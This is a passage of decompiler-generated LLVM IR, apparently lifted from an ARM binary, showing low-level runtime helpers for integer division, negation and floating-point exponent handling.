  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_14ffc = phi i32 [ %v4_14ff8, %.thread18 ], [ %v5_14ff8, %bb105 ]
  %v2_14ffc = xor i1 %v2_14ff4, true
  %v3_14ffc = or i1 %v7_14ff4, %v2_14ffc
  br i1 %v3_14ffc, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_14ffc = udiv i32 %v5_14ffc, 2
  %v9_14ffc = add i32 %v4_14ffc, %v8_14ffc
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_15000 = phi i32 [ %v4_14ffc, %bb106 ], [ %v9_14ffc, %bb107 ]
  %v6_15000 = lshr i32 %v0_14f2c, %v1_15000
  ret i32 %v6_15000

dec_label_pc_15008:                               ; preds = %bb82
  %v0_15008 = load i32, i32* @lr, align 4
  %v0_1500c = call i32 @function_cbe0()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_15008)
  %v9_15018 = load i32, i32* @lr, align 4
  %v0_1501c = call i32 @function_14f20()
  store i32 %v9_15018, i32* @lr, align 4
  ret i32 %v0_1501c

; uselistorder directives
  uselistorder i32 %v4_14ffc, { 1, 0 }
  uselistorder i1 %v7_14ff4, { 1, 0 }
  uselistorder i32 %v4_14fec, { 1, 0 }
  uselistorder i32 %v1_14fec, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14fe0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14fe0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14fd0, { 1, 0 }
  uselistorder i32 %v0_14fa8, { 1, 0 }
  uselistorder i32 %v4_14f9c, { 1, 0 }
  uselistorder i32 %v1_14fa4, { 1, 2, 0 }
  uselistorder i32 %v4_14f90, { 1, 0 }
  uselistorder i32 %v1_14f98, { 1, 2, 0 }
  uselistorder i32 %v4_14f84, { 1, 0 }
  uselistorder i32 %v1_14f8c, { 1, 2, 0 }
  uselistorder i32 %v1_14fb0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14f80, { 1, 0 }
  uselistorder i32 %v1_14fac, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14f6c, { 1, 0 }
  uselistorder i32 %v3_14f68, { 1, 0 }
  uselistorder i32 %v1_14f68, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_14f6c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14f58, { 1, 0 }
  uselistorder i32 %v4_14f54, { 2, 1, 0 }
  uselistorder i32 %v1_14f58, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14f60.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_14f2c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_14f20, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 ()* @function_14f20, { 12, 11, 10, 9, 7, 6, 5, 4, 3, 2, 8, 1, 0 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_14fb8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_14f74, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14f60thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_15030() local_unnamed_addr {
dec_label_pc_15030:
  %v0_15030 = load i32, i32* @r1, align 4
  %v1_15030 = icmp slt i32 %v0_15030, 0
  %v2_15030 = icmp eq i32 %v0_15030, 0
  %v0_15034 = load i32, i32* @r0, align 4
  %v2_15034 = xor i32 %v0_15034, %v0_15030
  br i1 %v2_15030, label %dec_label_pc_15148, label %dec_label_pc_1503c

dec_label_pc_1503c:                               ; preds = %dec_label_pc_15030
  br i1 %v1_15030, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1503c
  %v2_1503c = sub i32 0, %v0_15030
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1503c, %bb
  %v1_15108 = phi i32 [ %v2_1503c, %bb ], [ %v0_15030, %dec_label_pc_1503c ]
  %v1_15040 = add i32 %v1_15108, -1
  %v7_15040 = icmp eq i32 %v1_15108, 1
  br i1 %v7_15040, label %dec_label_pc_150e8, label %dec_label_pc_15048

dec_label_pc_15048:                               ; preds = %thread-pre-split
  %v1_15048 = icmp slt i32 %v0_15034, 0
  br i1 %v1_15048, label %bb86, label %bb87

bb86:                                             ; preds = %dec_label_pc_15048
  %v2_1504c = sub i32 0, %v0_15034
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_15048, %bb86
  %v0_1513c = phi i32 [ %v0_15034, %dec_label_pc_15048 ], [ %v2_1504c, %bb86 ]
  %v3_15050 = icmp uge i32 %v0_1513c, %v1_15108
  %v9_15050 = icmp eq i32 %v0_1513c, %v1_15108
  %v2_15054 = xor i1 %v3_15050, true
  %v3_15054 = or i1 %v9_15050, %v2_15054
  br i1 %v3_15054, label %dec_label_pc_150f4, label %dec_label_pc_15058

dec_label_pc_15058:                               ; preds = %bb87
  %v2_15058 = and i32 %v1_15040, %v1_15108
  %v4_15058 = icmp eq i32 %v2_15058, 0
  br i1 %v4_15058, label %dec_label_pc_15104, label %dec_label_pc_15060

dec_label_pc_15060:                               ; preds = %dec_label_pc_15058
  %v3_15060 = icmp ult i32 %v1_15108, 536870912
  br i1 %v3_15060, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_15060
  %v4_15064 = mul i32 %v1_15108, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_15060, %.thread
  %v0_15084.pr40.ph = phi i32 [ %v4_15064, %.thread ], [ %v1_15108, %dec_label_pc_15060 ]
  %storemerge144 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_15060 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb90
  %v0_15084.pr40 = phi i32 [ %v4_15078, %bb90 ], [ %v0_15084.pr40.ph, %.preheader.preheader ]
  %v1_1507c = phi i32 [ %v4_1507c, %bb90 ], [ %storemerge144, %.preheader.preheader ]
  %v2_15070 = icmp ugt i32 %v0_15084.pr40, 268435455
  br i1 %v2_15070, label %.thread3, label %bb88

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_15084thread-pre-split.loopexit

bb88:                                             ; preds = %.preheader
  %v4_15074 = icmp ult i32 %v0_15084.pr40, %v0_1513c
  br i1 %v4_15074, label %bb89, label %dec_label_pc_15084thread-pre-split.loopexit.loopexit

bb89:                                             ; preds = %bb88
  %v2_15078 = and i32 %v0_15084.pr40, 268435456
  %v3_15078 = icmp eq i32 %v2_15078, 0
  %v4_15078 = mul i32 %v0_15084.pr40, 16
  br i1 %v3_15078, label %bb90, label %dec_label_pc_15084.loopexit

bb90:                                             ; preds = %bb89
  %v2_1507c = and i32 %v1_1507c, 268435456
  %v3_1507c = icmp eq i32 %v2_1507c, 0
  %v4_1507c = mul i32 %v1_1507c, 16
  br i1 %v3_1507c, label %.preheader, label %dec_label_pc_15084thread-pre-split.loopexit.loopexit

dec_label_pc_15084thread-pre-split.loopexit.loopexit: ; preds = %bb90, %bb88
  %v1_1509052.ph = phi i32 [ %v1_1507c, %bb88 ], [ %v4_1507c, %bb90 ]
  %v0_15084.pr42.ph = phi i32 [ %v0_15084.pr40, %bb88 ], [ %v4_15078, %bb90 ]
  br label %dec_label_pc_15084thread-pre-split.loopexit

dec_label_pc_15084thread-pre-split.loopexit:      ; preds = %dec_label_pc_15084thread-pre-split.loopexit.loopexit, %.thread3
  %v1_1509052 = phi i32 [ %v1_1507c, %.thread3 ], [ %v1_1509052.ph, %dec_label_pc_15084thread-pre-split.loopexit.loopexit ]
  %v0_15084.pr42 = phi i32 [ %v0_15084.pr40, %.thread3 ], [ %v0_15084.pr42.ph, %dec_label_pc_15084thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_15084thread-pre-split

dec_label_pc_15084thread-pre-split:               ; preds = %dec_label_pc_15084thread-pre-split.loopexit, %bb92
  %v1_1509050 = phi i32 [ %v1_1509052, %dec_label_pc_15084thread-pre-split.loopexit ], [ %v3_15090, %bb92 ]
  %v2_1508848 = phi i32 [ %v0_1513c, %dec_label_pc_15084thread-pre-split.loopexit ], [ %v2_15088, %bb92 ]
  %v0_15084.pr = phi i32 [ %v0_15084.pr42, %dec_label_pc_15084thread-pre-split.loopexit ], [ %v3_1508c, %bb92 ]
  br label %dec_label_pc_15084

dec_label_pc_15084.loopexit:                      ; preds = %bb89
  br label %dec_label_pc_15084

dec_label_pc_15084:                               ; preds = %dec_label_pc_15084.loopexit, %dec_label_pc_15084thread-pre-split
  %v1_15090 = phi i32 [ %v1_1509050, %dec_label_pc_15084thread-pre-split ], [ %v1_1507c, %dec_label_pc_15084.loopexit ]
  %v2_15088 = phi i32 [ %v2_1508848, %dec_label_pc_15084thread-pre-split ], [ %v0_1513c, %dec_label_pc_15084.loopexit ]
  %v1_1508c = phi i32 [ %v0_15084.pr, %dec_label_pc_15084thread-pre-split ], [ %v4_15078, %dec_label_pc_15084.loopexit ]
  %v2_15084 = icmp slt i32 %v1_1508c, 0
  br i1 %v2_15084, label %dec_label_pc_15098, label %bb91

bb91:                                             ; preds = %dec_label_pc_15084
  %v4_15088 = icmp ult i32 %v1_1508c, %v2_15088
  br i1 %v4_15088, label %bb92, label %dec_label_pc_15098

bb92:                                             ; preds = %bb91
  %v3_1508c = mul i32 %v1_1508c, 2
  %v2_15090 = icmp slt i32 %v1_15090, 0
  %v3_15090 = mul i32 %v1_15090, 2
  br i1 %v2_15090, label %dec_label_pc_15098, label %dec_label_pc_15084thread-pre-split

dec_label_pc_15098:                               ; preds = %bb91, %dec_label_pc_15084, %bb92
  %v2_150a463 = phi i32 [ %v3_15090, %bb92 ], [ %v1_15090, %bb91 ], [ %v1_15090, %dec_label_pc_15084 ]
  %v1_1509c55 = phi i32 [ %v3_1508c, %bb92 ], [ %v1_1508c, %bb91 ], [ %v1_1508c, %dec_label_pc_15084 ]
  br label %dec_label_pc_1509c

dec_label_pc_1509c:                               ; preds = %.thread13, %dec_label_pc_15098
  %v1_150d0 = phi i32 [ %v4_150d0, %.thread13 ], [ %v2_150a463, %dec_label_pc_15098 ]
  %v1_150a4 = phi i32 [ %v1_150e0, %.thread13 ], [ 0, %dec_label_pc_15098 ]
  %v1_150d4 = phi i32 [ %v4_150d4, %.thread13 ], [ %v1_1509c55, %dec_label_pc_15098 ]
  %v1_150a0 = phi i32 [ %v0_150cc, %.thread13 ], [ %v0_1513c, %dec_label_pc_15098 ]
  %v3_1509c = icmp ult i32 %v1_150a0, %v1_150d4
  br i1 %v3_1509c, label %.thread8, label %bb93

bb93:                                             ; preds = %dec_label_pc_1509c
  %v3_150a0 = sub i32 %v1_150a0, %v1_150d4
  %v3_150a4 = or i32 %v1_150a4, %v1_150d0
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1509c, %bb93
  %v1_150ac = phi i32 [ %v1_150a0, %dec_label_pc_1509c ], [ %v3_150a0, %bb93 ]
  %v1_150b0 = phi i32 [ %v1_150a4, %dec_label_pc_1509c ], [ %v3_150a4, %bb93 ]
  %v4_150a8 = udiv i32 %v1_150d4, 2
  %v6_150a8 = icmp ult i32 %v1_150ac, %v4_150a8
  br i1 %v6_150a8, label %.thread9, label %bb94

bb94:                                             ; preds = %.thread8
  %v3_150ac = urem i32 %v1_150d4, 2
  %v4_150ac = icmp eq i32 %v3_150ac, 0
  %v6_150ac = sub i32 %v1_150ac, %v4_150a8
  br i1 %v4_150ac, label %.thread9, label %bb95

bb95:                                             ; preds = %bb94
  %v5_150b0 = udiv i32 %v1_150d0, 2
  %v6_150b0 = or i32 %v1_150b0, %v5_150b0
  br label %.thread9

.thread9:                                         ; preds = %bb94, %.thread8, %bb95
  %v1_150b8 = phi i32 [ %v6_150ac, %bb94 ], [ %v1_150ac, %.thread8 ], [ %v6_150ac, %bb95 ]
  %v1_150bc = phi i32 [ %v1_150b0, %bb94 ], [ %v1_150b0, %.thread8 ], [ %v6_150b0, %bb95 ]
  %v4_150b4 = udiv i32 %v1_150d4, 4
  %v6_150b4 = icmp ult i32 %v1_150b8, %v4_150b4
  br i1 %v6_150b4, label %.thread10, label %bb96

bb96:                                             ; preds = %.thread9
  %v3_150b8 = and i32 %v1_150d4, 2
  %v4_150b8 = icmp eq i32 %v3_150b8, 0
  %v6_150b8 = sub i32 %v1_150b8, %v4_150b4
  br i1 %v4_150b8, label %.thread10, label %bb97

bb97:                                             ; preds = %bb96
  %v5_150bc = udiv i32 %v1_150d0, 4
  %v6_150bc = or i32 %v1_150bc, %v5_150bc
  br label %.thread10

.thread10:                                        ; preds = %bb96, %.thread9, %bb97
  %v1_150c4 = phi i32 [ %v6_150b8, %bb96 ], [ %v1_150b8, %.thread9 ], [ %v6_150b8, %bb97 ]
  %v1_150c8 = phi i32 [ %v1_150bc, %bb96 ], [ %v1_150bc, %.thread9 ], [ %v6_150bc, %bb97 ]
  %v4_150c0 = udiv i32 %v1_150d4, 8
  %v6_150c0 = icmp ult i32 %v1_150c4, %v4_150c0
  br i1 %v6_150c0, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %.thread10
  %v3_150c4 = and i32 %v1_150d4, 4
  %v4_150c4 = icmp eq i32 %v3_150c4, 0
  %v6_150c4 = sub i32 %v1_150c4, %v4_150c0
  br i1 %v4_150c4, label %thread-pre-split12, label %bb99

bb99:                                             ; preds = %bb98
  %v5_150c8 = udiv i32 %v1_150d0, 8
  %v6_150c8 = or i32 %v1_150c8, %v5_150c8
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb99, %.thread10, %bb98
  %v1_150e0 = phi i32 [ %v1_150c8, %bb98 ], [ %v1_150c8, %.thread10 ], [ %v6_150c8, %bb99 ]
  %v0_150cc = phi i32 [ %v6_150c4, %bb98 ], [ %v1_150c4, %.thread10 ], [ %v6_150c4, %bb99 ]
  %v2_150cc = icmp eq i32 %v0_150cc, 0
  br i1 %v2_150cc, label %dec_label_pc_150dc, label %bb100

bb100:                                            ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_150d0, 16
  br i1 %tmp, label %dec_label_pc_150dc, label %.thread13

.thread13:                                        ; preds = %bb100
  %v4_150d0 = udiv i32 %v1_150d0, 16
  %v4_150d4 = udiv i32 %v1_150d4, 16
  br label %dec_label_pc_1509c

dec_label_pc_150dc:                               ; preds = %thread-pre-split12, %bb100
  %v1_150dc = icmp slt i32 %v2_15034, 0
  br i1 %v1_150dc, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_150dc
  %v2_150e0 = sub i32 0, %v1_150e0
  br label %.thread16

.thread16:                                        ; preds = %bb105, %bb104, %bb102, %dec_label_pc_150e8, %dec_label_pc_150dc, %bb101
  %v1_150e4 = phi i32 [ %v1_150e0, %dec_label_pc_150dc ], [ %v2_150e0, %bb101 ], [ %v2_150ec, %bb102 ], [ undef, %dec_label_pc_150e8 ], [ %v1_1510080, %bb104 ], [ %v2_150fc, %bb105 ]
  ret i32 %v1_150e4

dec_label_pc_150e8:                               ; preds = %thread-pre-split
  br i1 %v1_15030, label %bb102, label %.thread16

bb102:                                            ; preds = %dec_label_pc_150e8
  %v2_150ec = sub i32 0, %v0_15034
  br label %.thread16

dec_label_pc_150f4:                               ; preds = %bb87
  br i1 %v3_15050, label %bb104, label %bb103

bb103:                                            ; preds = %dec_label_pc_150f4
  br label %bb104

bb104:                                            ; preds = %dec_label_pc_150f4, %bb103
  %v1_1510080 = phi i32 [ %v0_15034, %dec_label_pc_150f4 ], [ 0, %bb103 ]
  br i1 %v9_15050, label %bb105, label %.thread16

bb105:                                            ; preds = %bb104
  %v4_150f8 = ashr i32 %v2_15034, 31
  %v2_150fc = or i32 %v4_150f8, 1
  br label %.thread16

dec_label_pc_15104:                               ; preds = %dec_label_pc_15058
  %v2_15104 = icmp ugt i32 %v1_15108, 65535
  br i1 %v2_15104, label %bb106, label %.thread19

bb106:                                            ; preds = %dec_label_pc_15104
  %v2_15108 = and i32 %v1_15108, 32768
  %v3_15108 = icmp eq i32 %v2_15108, 0
  %v4_15108 = udiv i32 %v1_15108, 65536
  br i1 %v3_15108, label %.thread19, label %bb107

.thread19:                                        ; preds = %bb106, %dec_label_pc_15104
  %v0_1511470 = phi i32 [ %v1_15108, %dec_label_pc_15104 ], [ %v4_15108, %bb106 ]
  br label %bb107

bb107:                                            ; preds = %bb106, %.thread19
  %v1_15118 = phi i32 [ %v0_1511470, %.thread19 ], [ %v4_15108, %bb106 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb106 ]
  %v2_15114 = icmp ugt i32 %v1_15118, 255
  br i1 %v2_15114, label %bb108, label %.thread20

bb108:                                            ; preds = %bb107
  %v2_15118 = and i32 %v1_15118, 128
  %v3_15118 = icmp eq i32 %v2_15118, 0
  %v4_15118 = udiv i32 %v1_15118, 256
  br i1 %v3_15118, label %.thread20, label %bb109

bb109:                                            ; preds = %bb108
  %v2_1511c = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb108, %bb107, %bb109
  %v1_15128 = phi i32 [ %storemerge, %bb107 ], [ %storemerge, %bb108 ], [ %v2_1511c, %bb109 ]
  %v1_15124 = phi i32 [ %v1_15118, %bb107 ], [ %v4_15118, %bb108 ], [ %v4_15118, %bb109 ]
  %v2_15120 = icmp ugt i32 %v1_15124, 15
  br i1 %v2_15120, label %bb110, label %.thread21

bb110:                                            ; preds = %.thread20
  %v2_15124 = and i32 %v1_15124, 8
  %v3_15124 = icmp eq i32 %v2_15124, 0
  %v4_15124 = udiv i32 %v1_15124, 16
  br i1 %v3_15124, label %.thread21, label %bb111

bb111:                                            ; preds = %bb110
  %v2_15128 = add nsw i32 %v1_15128, 4
  br label %.thread21

.thread21:                                        ; preds = %bb110, %.thread20, %bb111
  %v4_15130 = phi i32 [ %v1_15128, %.thread20 ], [ %v1_15128, %bb110 ], [ %v2_15128, %bb111 ]
  %v5_15134 = phi i32 [ %v1_15124, %.thread20 ], [ %v4_15124, %bb110 ], [ %v4_15124, %bb111 ]
  %v2_1512c = icmp ugt i32 %v5_15134, 3
  %v7_1512c = icmp eq i32 %v5_15134, 4
  %v2_15130 = xor i1 %v7_1512c, true
  %v3_15130 = and i1 %v2_1512c, %v2_15130
  br i1 %v3_15130, label %bb112, label %bb113

bb112:                                            ; preds = %.thread21
  %v5_15130 = add nsw i32 %v4_15130, 3
  br label %bb113

bb113:                                            ; preds = %.thread21, %bb112
  %v4_15134 = phi i32 [ %v4_15130, %.thread21 ], [ %v5_15130, %bb112 ]
  %v2_15134 = xor i1 %v2_1512c, true
  %v3_15134 = or i1 %v7_1512c, %v2_15134
  br i1 %v3_15134, label %bb114, label %bb115

bb114:                                            ; preds = %bb113
  %v8_15134 = udiv i32 %v5_15134, 2
  %v9_15134 = add i32 %v4_15134, %v8_15134
  br label %bb115

bb115:                                            ; preds = %bb113, %bb114
  %v1_1513c = phi i32 [ %v4_15134, %bb113 ], [ %v9_15134, %bb114 ]
  %v1_15138 = icmp slt i32 %v2_15034, 0
  %v6_1513c = lshr i32 %v0_1513c, %v1_1513c
  %v2_15140 = sub i32 0, %v6_1513c
  %v2_15140.v6_1513c = select i1 %v1_15138, i32 %v2_15140, i32 %v6_1513c
  ret i32 %v2_15140.v6_1513c

dec_label_pc_15148:                               ; preds = %dec_label_pc_15030
  %v0_15148 = load i32, i32* @lr, align 4
  %v0_1514c = call i32 @function_cbe0()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_15148)
  %v9_15158 = load i32, i32* @lr, align 4
  %v0_1515c = call i32 @function_15030()
  store i32 %v9_15158, i32* @lr, align 4
  ret i32 %v0_1515c

; uselistorder directives
  uselistorder i32 %v4_15134, { 1, 0 }
  uselistorder i1 %v7_1512c, { 1, 0 }
  uselistorder i32 %v4_15124, { 1, 0 }
  uselistorder i32 %v1_15124, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15118, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_15118, { 1, 0, 2, 3 }
  uselistorder i32 %v4_15108, { 1, 0 }
  uselistorder i32 %v0_150cc, { 1, 0 }
  uselistorder i32 %v4_150c0, { 1, 0 }
  uselistorder i32 %v1_150c8, { 1, 2, 0 }
  uselistorder i32 %v4_150b4, { 1, 0 }
  uselistorder i32 %v1_150bc, { 1, 2, 0 }
  uselistorder i32 %v4_150a8, { 1, 0 }
  uselistorder i32 %v1_150b0, { 1, 2, 0 }
  uselistorder i32 %v1_150d4, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_150a4, { 1, 0 }
  uselistorder i32 %v1_150d0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_15090, { 1, 0 }
  uselistorder i32 %v3_1508c, { 1, 0 }
  uselistorder i32 %v1_1508c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_15088, { 1, 0 }
  uselistorder i32 %v1_15090, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1507c, { 1, 0 }
  uselistorder i32 %v4_15078, { 2, 1, 0 }
  uselistorder i32 %v1_1507c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_15084.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_15050, { 1, 0 }
  uselistorder i32 %v1_15108, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_15034, { 1, 0, 2 }
  uselistorder i32 %v0_15034, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_15030, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_15030, { 2, 0, 1 }
  uselistorder i32 ()* @function_cbe0, { 3, 2, 1, 0 }
  uselistorder i32 268435455, { 2, 3, 4, 0, 5, 1 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_150dc, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_15098, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15084thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_15170(i32 %arg1) local_unnamed_addr {
dec_label_pc_15170:
  %v1_15170 = sub i32 0, %arg1
  store i32 %v1_15170, i32* @r0, align 4
  %v0_15174 = call i32 @function_1517c()
  ret i32 %v0_15174

; uselistorder directives
  uselistorder i32 ()* @function_1517c, { 1, 0 }
}

define i32 @function_15178(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15178:
  %v2_15178 = load i32, i32* @r0, align 4
  ret i32 %v2_15178
}

define i32 @function_1517c() local_unnamed_addr {
dec_label_pc_1517c:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1517c = load i32, i32* @r4, align 4
  store i32 %v3_1517c, i32* %stack_var_-12, align 4
  %v6_1517c = load i32, i32* @r5, align 4
  %v0_15180 = load i32, i32* @r0, align 4
  %v2_15180 = mul i32 %v0_15180, 2
  store i32 %v2_15180, i32* %r4.global-to-local, align 4
  %v0_15184 = load i32, i32* @r2, align 4
  %v2_15184 = mul i32 %v0_15184, 2
  store i32 %v2_15184, i32* %r5.global-to-local, align 4
  %v4_15188 = icmp eq i32 %v2_15184, %v2_15180
  %v1_1518c = load i32, i32* @r1, align 4
  br i1 %v4_15188, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1517c
  %v2_1518c = load i32, i32* @r3, align 4
  %v5_1518c = icmp eq i32 %v2_1518c, %v1_1518c
  br i1 %v5_1518c, label %.thread3, label %.thread

.thread:                                          ; preds = %dec_label_pc_1517c, %bb
  %v3_15190 = or i32 %v1_1518c, %v2_15180
  %v5_15190 = icmp eq i32 %v3_15190, 0
  br i1 %v5_15190, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_15194 = load i32, i32* @r3, align 4
  %v3_15194 = or i32 %v2_15194, %v2_15184
  %v5_15194 = icmp eq i32 %v3_15194, 0
  br i1 %v5_15194, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_15180.off = add i32 %v2_15180, 4194303
  %tmp = icmp ult i32 %v2_15180.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_15184.off = add i32 %v2_15184, 4194303
  %tmp18 = icmp ult i32 %v2_15184.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_151a0 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_151a0, i32 ptrtoint (i32* @global_var_153c0.637 to i32))
  %v0_151a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_151a4 = udiv i32 %v0_151a4, 2097152
  store i32 %v3_151a4, i32* @r4, align 4
  %v1_151a8 = load i32, i32* %r5.global-to-local, align 4
  %v4_151a8 = udiv i32 %v1_151a8, 2097152
  %v5_151a8 = sub nsw i32 %v4_151a8, %v3_151a4
  %v5_151ac = icmp ult i32 %v4_151a8, %v3_151a4
  br i1 %v5_151ac, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_151ac = sub nsw i32 0, %v5_151a8
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_151ac, %bb14 ], [ %v5_151a8, %.thread3 ]
  %v1_1520c = phi i32 [ %v7_151ac, %bb14 ], [ %v5_151a8, %.thread3 ]
  store i32 %storemerge, i32* @r5, align 4
  %v7_151b0 = icmp ugt i32 %v4_151a8, %v3_151a4
  br i1 %v7_151b0, label %dec_label_pc_151b4, label %dec_label_pc_151d0

dec_label_pc_151b4:                               ; preds = %bb15
  %v2_151b4 = add nsw i32 %v1_1520c, %v3_151a4
  store i32 %v2_151b4, i32* @r4, align 4
  %v0_151b8 = load i32, i32* @r1, align 4
  %v1_151b8 = load i32, i32* @r3, align 4
  %v0_151bc = load i32, i32* @r0, align 4
  %v1_151bc = load i32, i32* @r2, align 4
  store i32 %v1_151b8, i32* @r1, align 4
  store i32 %v1_151bc, i32* %r0.global-to-local, align 4
  store i32 %v0_151b8, i32* @r3, align 4
  store i32 %v0_151bc, i32* @r2, align 4
  br label %dec_label_pc_151d0

dec_label_pc_151d0:                               ; preds = %bb15, %dec_label_pc_151b4
  %v0_1520c = phi i32 [ %v2_151b4, %dec_label_pc_151b4 ], [ %v3_151a4, %bb15 ]
  %.0 = phi i32 [ %v1_151bc, %dec_label_pc_151b4 ], [ undef, %bb15 ]
  %tmp19 = icmp ugt i32 %v1_1520c, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_151d0
  %v6_151d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_151d4, i32* @r4, align 4
  store i32 %v6_1517c, i32* @r5, align 4
  ret i32 %.0

bb17:                                             ; preds = %dec_label_pc_151d0
  %v3_151d8 = icmp sgt i32 %.0, -1
  %v4_151e4 = urem i32 %.0, 1048576
  %v5_151e4 = or i32 %v4_151e4, 1048576
  store i32 %v5_151e4, i32* %r0.global-to-local, align 4
  br i1 %v3_151d8, label %dec_label_pc_151f4, label %dec_label_pc_151ec

dec_label_pc_151ec:                               ; preds = %bb17
  %v0_151ec = load i32, i32* @r1, align 4
  %v2_151ec = icmp eq i32 %v0_151ec, 0
  %v2_151f0 = icmp eq i1 %v2_151ec, false
  %v5_151f0 = sext i1 %v2_151f0 to i32
  %v6_151f0 = sub nsw i32 %v5_151f0, %v5_151e4
  store i32 %v6_151f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_151f4

dec_label_pc_151f4:                               ; preds = %bb17, %dec_label_pc_151ec
  %v0_151f4 = load i32, i32* @r2, align 4
  %v3_151f4 = icmp sgt i32 %v0_151f4, -1
  br i1 %v3_151f4, label %dec_label_pc_1520c, label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %dec_label_pc_151f4
  br label %dec_label_pc_1520c

dec_label_pc_1520c:                               ; preds = %dec_label_pc_151f4, %dec_label_pc_15204
  %v4_1520c = icmp eq i32 %v0_1520c, %v1_1520c
  call void @__pseudo_cond_branch(i1 %v4_1520c, i32 ptrtoint (i32* @global_var_153a8.638 to i32))
  %v1_15210 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15210

; uselistorder directives
  uselistorder i32 %.0, { 1, 0, 2 }
  uselistorder i32 %v1_151bc, { 1, 0 }
